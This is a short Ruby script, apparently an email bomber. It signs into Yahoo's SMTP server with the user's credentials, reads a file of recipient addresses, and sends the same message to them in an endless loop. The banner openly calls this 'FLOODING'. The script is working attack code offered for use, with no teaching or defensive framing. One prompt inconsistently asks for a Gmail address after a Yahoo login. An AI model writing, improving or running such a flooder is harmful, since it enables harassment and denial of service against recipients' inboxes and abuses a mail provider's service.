require 'mail'
require 'io/console'
require 'colorize'

print "Enter Your Yahoo Mail: " 
email = gets

print "Enter Your Password: "
pass = STDIN.noecho(&:gets)
 
print "\n"       

		options = { :address              => "smtp.mail.yahoo.com",
					:port                 => 587,
					:user_name            => email,
					:password             => pass,
					:authentication       => 'plain',
					:enable_starttls_auto => true  }

					
				 
		Mail.defaults do
		  delivery_method :smtp, options
		end



		def required(to , from ,subject,body)
		Mail.deliver do

  
		  to to
		  from from
		  subject subject
		  body body
		 
              end
	        end  
	    


       
        puts "ATTENTION ! Make sure the text file is inside mailer folder".red
	    puts "ATTENTION ! Make sure that each email within the text file
	    is seprate with a coma or else it wont be able to read".red

	    print "Enter File Name: "
	    mailto=File.read(gets.chomp)
	    
		print"Enter Your Gmail Address Again: "
		mailfrom=gets

		print"Enter Subject: "
		header=gets

		print "Enter Message: "
		message=gets

		puts"\n"
		puts "====================================".yellow
		puts "  PRESS CTRL+C TO STOP FLOODING".red
		puts "====================================".yellow
		 
			 
			 loop do
			    required(mailto, mailfrom , header , message)
			
			      puts"[+] SENT !".yellow
	         end

